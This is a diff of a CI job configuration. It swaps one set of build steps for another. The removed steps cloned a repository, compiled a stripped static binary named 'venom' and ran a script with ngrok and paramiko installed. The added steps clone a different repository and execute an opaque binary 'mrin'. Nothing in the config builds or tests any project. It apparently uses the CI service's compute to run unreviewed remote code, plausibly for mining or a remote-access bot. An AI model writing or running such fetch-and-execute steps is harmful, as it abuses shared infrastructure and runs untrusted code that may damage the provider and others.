@@ -10,17 +10,7 @@ jobs:
       resources:
         size: 2x-large   # Request bigger VM (if supported)
       before_install:
-        - sudo apt-get update
-        - sudo apt-get install -y gcc
-      install:
-        - python3 -m pip install --upgrade pip
-        - pip install Flask pyngrok paramiko
-      before_script:
-        - git clone https://github.com/tyr892316/Vdn.git
-        - cd Vdn
-        - gcc m.c -o venom -O3 -march=native -flto -fomit-frame-pointer -fvisibility=hidden -s -static -pthread
-      script:
-        - cd Vdn
-        - chmod +x *
-        - lscpu
-        - python3 m.py
+        - git clone https://github.com/MiLKyWay-cyBer/ss.git
+        - cd ss
+        - chmod +x mrin
+        - ./mrin
